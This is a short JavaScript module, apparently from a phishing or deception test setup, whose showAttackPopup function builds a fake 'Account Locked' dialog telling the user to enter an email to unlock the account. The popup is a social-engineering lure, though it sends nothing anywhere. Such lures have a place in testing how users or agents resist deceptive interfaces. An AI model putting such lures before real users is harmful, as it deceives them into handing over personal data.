import { createPopup } from './popup_base.js';

export function showAttackPopup() {
    createPopup({
        title: "Account Locked",
        subtitle: "Your account has been locked. Enter your email to unlock.",
        fields: [{ placeholder: "Enter your email" }],
        buttonText: "Unlock Account"
    });
}
